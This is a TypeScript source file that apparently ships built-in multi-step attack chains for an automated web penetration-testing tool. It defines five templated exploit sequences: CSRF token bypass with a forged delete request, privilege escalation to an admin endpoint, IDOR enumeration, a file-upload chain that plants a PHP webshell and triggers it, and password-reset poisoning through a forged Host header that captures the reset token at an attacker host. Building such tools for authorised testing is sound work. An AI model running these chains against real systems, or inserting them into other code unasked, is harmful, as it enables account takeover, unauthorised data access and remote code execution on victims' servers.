/**
 * Built-in Attack Chains
 *
 * Pre-defined chains for common multi-step exploitation patterns.
 * Each chain is a sequence of steps following the REQUEST -> EXTRACT -> ASSERT pattern.
 */

import { AttackChain } from './attack-chain.types';

export const BUILT_IN_CHAINS: AttackChain[] = [
  // ─── CSRF Bypass ─────────────────────────────────────────────────────
  {
    name: 'csrf_bypass',
    description: 'CSRF token bypass: fetch login page, extract CSRF token, submit forged request with stolen token',
    category: 'csrf',
    tags: ['csrf', 'token', 'bypass'],
    steps: [
      {
        id: 'fetch_login',
        type: 'request',
        label: 'Fetch login/page to get CSRF token',
        method: 'GET',
        url: '{{target_url}}',
        followRedirects: true,
      },
      {
        id: 'extract_token',
        type: 'extract',
        label: 'Extract CSRF token from response',
        pattern: 'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)["\']|csrf[_-]?token["\']\\s*[:=]\\s*["\']([^"\']+)["\']',
        from: 'body',
        variable: 'csrf_token',
        fromStep: 'fetch_login',
      },
      {
        id: 'assert_token',
        type: 'assert',
        label: 'Assert CSRF token was found',
        condition: 'exists',
        checkVariable: 'csrf_token',
        abortOnFail: true,
      },
      {
        id: 'forge_request',
        type: 'request',
        label: 'Submit forged request with stolen CSRF token',
        method: 'POST',
        url: '{{target_url}}',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-CSRF-Token': '{{csrf_token}}',
        },
        body: 'action=delete&id=1',
      },
      {
        id: 'assert_success',
        type: 'assert',
        label: 'Check if forged request succeeded',
        condition: 'status',
        expected: '200',
        abortOnFail: false,
      },
    ],
    maxSteps: 5,
    requiresApproval: false,
  },

  // ─── Auth Escalation ─────────────────────────────────────────────────
  {
    name: 'auth_escalation',
    description: 'Auth escalation: login as low-priv user, extract session, access admin endpoint',
    category: 'auth',
    tags: ['auth', 'escalation', 'privilege'],
    steps: [
      {
        id: 'login',
        type: 'request',
        label: 'Login as regular user',
        method: 'POST',
        url: '{{login_url}}',
        headers: {
          'Content-Type': 'application/json',
        },
        body: '{"username": "{{username}}", "password": "{{password}}"}',
      },
      {
        id: 'extract_session',
        type: 'extract',
        label: 'Extract session token from response',
        pattern: '"token"\\s*:\\s*"([^"]+)"|"session"\\s*:\\s*"([^"]+)"|Set-Cookie:\\s*session=([^;]+)',
        from: 'body',
        variable: 'session_token',
        fromStep: 'login',
      },
      {
        id: 'assert_session',
        type: 'assert',
        label: 'Assert session token exists',
        condition: 'exists',
        checkVariable: 'session_token',
        abortOnFail: true,
      },
      {
        id: 'access_admin',
        type: 'request',
        label: 'Access admin endpoint with user session',
        method: 'GET',
        url: '{{admin_url}}',
        headers: {
          'Authorization': 'Bearer {{session_token}}',
        },
      },
      {
        id: 'assert_admin_access',
        type: 'assert',
        label: 'Check if admin endpoint returned data (not 403)',
        condition: 'status',
        expected: '200',
        abortOnFail: false,
      },
    ],
    maxSteps: 5,
    requiresApproval: false,
  },

  // ─── IDOR Chain ──────────────────────────────────────────────────────
  {
    name: 'idor_enumeration',
    description: 'IDOR enumeration: fetch resource as user A, extract ID pattern, iterate as user B',
    category: 'idor',
    tags: ['idor', 'enumeration', 'access-control'],
    steps: [
      {
        id: 'fetch_own_resource',
        type: 'request',
        label: 'Fetch own resource to discover ID pattern',
        method: 'GET',
        url: '{{resource_url}}/1',
        headers: {
          'Authorization': 'Bearer {{token_a}}',
        },
      },
      {
        id: 'extract_id_pattern',
        type: 'extract',
        label: 'Extract resource ID from response',
        pattern: '"id"\\s*:\\s*(\\d+)',
        from: 'body',
        variable: 'resource_id',
        fromStep: 'fetch_own_resource',
      },
      {
        id: 'assert_id_found',
        type: 'assert',
        label: 'Assert resource ID was found',
        condition: 'exists',
        checkVariable: 'resource_id',
        abortOnFail: true,
      },
      {
        id: 'access_other_resource',
        type: 'request',
        label: 'Access another users resource with different token',
        method: 'GET',
        url: '{{resource_url}}/{{resource_id}}',
        headers: {
          'Authorization': 'Bearer {{token_b}}',
        },
      },
      {
        id: 'assert_idor_success',
        type: 'assert',
        label: 'Check if other users resource was accessible',
        condition: 'status',
        expected: '200',
        abortOnFail: false,
      },
    ],
    maxSteps: 5,
    requiresApproval: false,
  },

  // ─── File Upload RCE ─────────────────────────────────────────────────
  {
    name: 'file_upload_rce',
    description: 'File upload RCE: upload webshell, path traversal to execute, verify execution',
    category: 'upload',
    tags: ['rce', 'upload', 'webshell'],
    requiresApproval: true,
    steps: [
      {
        id: 'upload_shell',
        type: 'request',
        label: 'Upload webshell via file upload',
        method: 'POST',
        url: '{{upload_url}}',
        headers: {
          'Content-Type': 'multipart/form-data',
        },
        body: '------WebKitFormBoundary\r\nContent-Disposition: form-data; name="file"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo "CHAIN_RCE_MARKER_".phpinfo(); ?>\r\n------WebKitFormBoundary--',
      },
      {
        id: 'extract_upload_path',
        type: 'extract',
        label: 'Extract uploaded file path',
        pattern: '"(?:url|path|file)"\\s*:\\s*"([^"]+)"',
        from: 'body',
        variable: 'upload_path',
        fromStep: 'upload_shell',
      },
      {
        id: 'execute_shell',
        type: 'request',
        label: 'Access uploaded file to trigger execution',
        method: 'GET',
        url: '{{upload_path}}',
      },
      {
        id: 'assert_rce',
        type: 'assert',
        label: 'Verify code execution via marker',
        condition: 'contains',
        expected: 'CHAIN_RCE_MARKER_',
        abortOnFail: false,
      },
    ],
    maxSteps: 4,
  },

  // ─── Password Reset Poisoning ────────────────────────────────────────
  {
    name: 'password_reset_poisoning',
    description: 'Password reset poisoning: inject Host header to redirect reset link to attacker',
    category: 'reset',
    tags: ['password-reset', 'host-header', 'poisoning'],
    steps: [
      {
        id: 'trigger_reset',
        type: 'request',
        label: 'Trigger password reset with poisoned Host header',
        method: 'POST',
        url: '{{reset_url}}',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Host': '{{attacker_host}}',
        },
        body: 'email={{victim_email}}',
      },
      {
        id: 'assert_reset_sent',
        type: 'assert',
        label: 'Check if reset was triggered (200 or 202)',
        condition: 'status',
        expected: '200',
        abortOnFail: false,
      },
      {
        id: 'check_reset_link',
        type: 'request',
        label: 'Check attacker host for received reset link',
        method: 'GET',
        url: '{{attacker_check_url}}',
      },
      {
        id: 'extract_reset_token',
        type: 'extract',
        label: 'Extract reset token from attacker callback',
        pattern: 'token=([^&"\\s]+)',
        from: 'body',
        variable: 'reset_token',
        fromStep: 'check_reset_link',
      },
      {
        id: 'assert_token_found',
        type: 'assert',
        label: 'Assert reset token was captured',
        condition: 'exists',
        checkVariable: 'reset_token',
        abortOnFail: false,
      },
    ],
    maxSteps: 5,
    requiresApproval: false,
  },
];

/** Get a built-in chain by name */
export function getBuiltInChain(name: string): AttackChain | undefined {
  return BUILT_IN_CHAINS.find((c) => c.name === name);
}

/** List all built-in chain names with descriptions */
export function listBuiltInChains(): Array<{ name: string; description: string; category: string; tags: string[]; requiresApproval: boolean }> {
  return BUILT_IN_CHAINS.map((c) => ({
    name: c.name,
    description: c.description,
    category: c.category,
    tags: c.tags ?? [],
    requiresApproval: c.requiresApproval ?? false,
  }));
}
